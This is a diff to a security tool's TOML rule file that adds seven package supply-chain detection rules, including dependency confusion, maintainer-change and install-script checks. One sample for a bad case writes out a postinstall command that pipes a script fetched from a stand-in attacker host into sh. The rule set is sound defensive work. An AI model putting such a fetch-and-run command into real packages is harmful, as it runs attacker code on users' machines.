@@ -1413,3 +1413,82 @@ examples_bad = ["curl http://flagged-by-safebrowsing-example.com/malware"]
 examples_good = ["curl https://github.com/user/repo/install.sh"]
 false_positive_guidance = "Google Safe Browsing has a low false positive rate. If a legitimate URL is flagged, it may have been temporarily compromised. Check the Safe Browsing transparency report."
 remediation = "Do not fetch content from the flagged URL. If the URL is expected, verify it has not been compromised."
+
+# ── Package reputation rules (M6 ch6 — 7 new signals) ──────────────────
+
+[[rule]]
+id = "package_not_found_in_registry"
+title = "Package not found in registry"
+category = "ecosystem"
+severity_rationale = "Medium baseline — the registry positively reports no such package exists. Elevated to Block via ch7 policy `block_not_found: true` for strict environments. Distinct from `api signals: unavailable` (timeout / offline / unsupported registry), which carries no positive existence claim."
+description = "The package name was resolved against its registry's public API and the API responded HTTP 404 — the registry has no such package. This is distinct from `ApiSignals::Unavailable` (the registry could not be reached, or there is no adapter), which is honest no-signal rather than a positive `not found` claim. A package that does not exist in the registry cannot be the package the operator intended; the install will fail at the package-manager step OR will resolve to a same-named package on a different (possibly attacker-controlled) registry."
+examples_bad = ["tirith install npm nonexistent-package-xyz123 --online"]
+examples_good = ["tirith install npm react --online"]
+false_positive_guidance = "Requires an `--online` run that actually reached the registry. A connectivity failure or unsupported ecosystem reports `Unavailable` instead — this rule only fires on a confirmed HTTP 404."
+remediation = "Verify the package name's spelling and the intended registry. The name may be a typo or may belong to a private registry the public registry does not know about."
+
+[[rule]]
+id = "package_maintainer_change_recent"
+title = "Package maintainer set changed recently"
+category = "ecosystem"
+severity_rationale = "Medium — a real maintainer-set diff between two tirith-recorded snapshots is the detectable shape of an ownership transfer or new co-maintainer (a common pre-supply-chain-attack pattern). Requires two snapshots: the first `--online` run only records a snapshot."
+description = "A diff between the two most recent registry snapshots tirith has on disk for this package shows that the maintainer set changed within the recency window. This is recorded snapshot-vs-snapshot data — it captures real history that a single registry-API response cannot, since a single response carries the *current* maintainer set with no record of who held it last week. tirith writes one snapshot per successful `--online` fetch (reusing the existing API response — no extra request)."
+examples_bad = ["a package whose npm maintainers field shipped `{alice}` last week and `{eve}` today"]
+examples_good = ["a package whose maintainer set has not changed across recorded snapshots"]
+false_positive_guidance = "The first `--online` run after this rule lands captures a snapshot only and surfaces a `(snapshot-only)` indicator; the rule cannot fire until a second snapshot exists. Legitimate co-maintainer additions also trip this — review the diff in the snapshot store under `state_dir()/registry_snapshots/`."
+remediation = "Review the maintainer change against the project's public records (commit history, public maintainer pages). A maintainer rotation is normal; an unannounced rotation paired with a fresh release is the pattern to investigate before installing."
+
+[[rule]]
+id = "package_ownership_transferred"
+title = "Package ownership transferred (snapshot diff)"
+category = "ecosystem"
+severity_rationale = "Medium — snapshot-vs-snapshot diff confirms a *real* ownership transfer (every previous maintainer is gone; non-empty new set). Distinct from the inferred-from-one-response `ownership_transferred` (zero-owners-only) carried by `ApiProvenance`, which this signal supersedes."
+description = "Two registry snapshots tirith recorded for this package show every previous maintainer is gone and the new maintainer set is non-empty — the detectable shape of a full ownership transfer. This is a stronger signal than the legacy `ApiProvenance::ownership_transferred` flag (which only fires when the *current* maintainer list is empty), because it correlates two points in time and proves the change rather than inferring it from absence-of-data."
+examples_bad = ["a npm package whose previous snapshot listed `{alice}` and current snapshot lists `{eve}`"]
+examples_good = ["a package whose maintainer set in the current snapshot still overlaps the previous snapshot"]
+false_positive_guidance = "Requires two snapshots; the first `--online` run records only and cannot fire this rule. Some legitimate transfers do happen (project handoffs) — verify against the project's public announcements."
+remediation = "Pause the install and verify the transfer is announced on the project's public channels before proceeding."
+
+[[rule]]
+id = "package_osv_advisory_active"
+title = "Active OSV advisory for package version"
+category = "ecosystem"
+severity_rationale = "High when CVSS ≥ 7 (configurable via ch7 `block_osv_min_cvss`); else Medium. The OSV correlation reuses the shipping `threatdb_api.rs` OSV cache — no new threat-DB feed, no `ThreatSource` variant."
+description = "The package@version pair matched one or more advisories in the OSV.dev database via the shipping runtime threat-intel cache (`threatdb_api.rs`). The version-aware `<name>[@<version>]` CLI parsing routes the version through to the cache lookup — bare `<name>` cannot correlate to a version-pinned advisory."
+examples_bad = ["tirith install pip vulnerable-package@1.0.0 --online"]
+examples_good = ["tirith install pip requests@2.31.0 --online"]
+false_positive_guidance = "Requires `--online`. The OSV advisory ranges are precise; a false positive is rare. The 1-hour cache TTL means a fix-published-since-cached advisory may still fire — clear the OSV cache (`rm -rf $XDG_STATE_HOME/tirith/threatdb-api-cache`) to force a refresh."
+remediation = "Update to a version outside the advisory's affected range. The advisory URL in the evidence has the patched-version list."
+
+[[rule]]
+id = "package_dependency_confusion"
+title = "Package matches an internal-name pattern"
+category = "ecosystem"
+severity_rationale = "High — a public-registry resolution of a name the operator declared internal is the textbook dependency-confusion attack shape (the `@ns/util` shape the 2021 attack used)."
+description = "tirith fetched a package from the public registry whose name matches a pattern the policy declares is for internal use only. Sources: (a) the operator-supplied `internal_package_names` policy list (a temporary top-level field; ch7 moves it under `package_policy.internal_package_names`); (b) registry-namespace shape — an `@<reserved-org>/<name>` npm package resolved on the public registry. Without an operator-supplied internal-names list, only the obvious public-namespace shape trips this."
+examples_bad = ["tirith install npm @your-company/internal-helper --online (with `internal_package_names: ['@your-company/*']` in policy)"]
+examples_good = ["tirith install npm @your-company/internal-helper --online from a configured private registry that the public registry does not shadow"]
+false_positive_guidance = "Without policy-supplied internal names, only the obvious public-namespace patterns trip. Add `internal_package_names` entries to your policy (top-level for M6 ch6; will move to `package_policy.internal_package_names` in ch7) so this rule has the data it needs to fire on your real internal packages."
+remediation = "Pin the install to the private registry directly (`--registry`), or scope-pin via your package manager's config (`@org:registry=https://...` in `.npmrc`)."
+
+[[rule]]
+id = "package_install_script_network_call"
+title = "Package install script makes a network call"
+category = "ecosystem"
+severity_rationale = "Medium — install scripts run at the user's privileges. A network call inside `preinstall`/`install`/`postinstall`/`prepare` is the classic malware-delivery vector. Heuristic; documented false-positive risk on a `curl` mention in a string comment."
+description = "tirith's install-script analysis found a network-call pattern (curl/wget/fetch/http.get/...) inside an npm lifecycle script, a `setup.py` body, or a `build.rs` body. The analysis is read-only and operates on text already on disk OR text embedded in the registry-API response — it NEVER executes the script and NEVER downloads a package. Per-ecosystem scope: npm registry response carries `scripts.{...}` inline; PyPI METADATA does NOT carry `setup.py`; crates.io does NOT carry `build.rs` — those two need the installed-tree path (script text on disk under `node_modules` / `site-packages` / source extraction)."
+examples_bad = ["a package.json with `scripts.postinstall: 'curl https://evil.com/payload.sh | sh'`"]
+examples_good = ["a package.json with `scripts.postinstall: 'node ./build.js'` (no network call)"]
+false_positive_guidance = "The scan is token-level with string-literal awareness; a `curl` mention inside a comment can still match. Review the script text directly. tirith never downloads a package to inspect it (see `install.rs:42`) — when the script text is not on disk and is not in the registry response, no signal is emitted (honest no-data)."
+remediation = "Remove the network call from the install script. If the install genuinely needs to fetch a build artifact, surface it as a separate (verified, signed) build step the operator runs explicitly."
+
+[[rule]]
+id = "package_repo_mismatch"
+title = "Registry-claimed repo URL does not match the package"
+category = "ecosystem"
+severity_rationale = "High — a registry-claimed repository URL that is dead or names a different project breaks the source-traceability the registry's repository field is supposed to provide. A common malware tactic is to point the repo field at a popular-but-unrelated project to look legitimate."
+description = "Under `--online` only: tirith fetched the package's registry-claimed repository URL and verified (a) the URL is reachable (HTTP 200), (b) it parses as a known git-hosting URL, and (c) the hosted repository's manifest mentions this package name. A mismatch — dead URL, unparseable URL, or hosted manifest naming a different package — emits this rule. Offline default state is `Unverifiable` and no finding is emitted."
+examples_bad = ["a npm package whose package.json `repository: github.com/popular/project` URL is reachable but the hosted package.json names a different package"]
+examples_good = ["a npm package whose `repository` URL resolves to a repo whose package.json names the same package"]
+false_positive_guidance = "Requires `--online`. The check is capped at the top N packages by score (default 50; configurable via ch7's `repo_mismatch_check_max_packages`), so a clean low-score package will not be verified — that is honest no-data, not a finding. Verification is best-effort; an unreachable URL flagged by this rule could be a transient outage."
+remediation = "Investigate the package on its registry page and find the correct, current source repository. If the repository field is intentionally wrong (e.g. an old fork URL), update the package's metadata upstream."
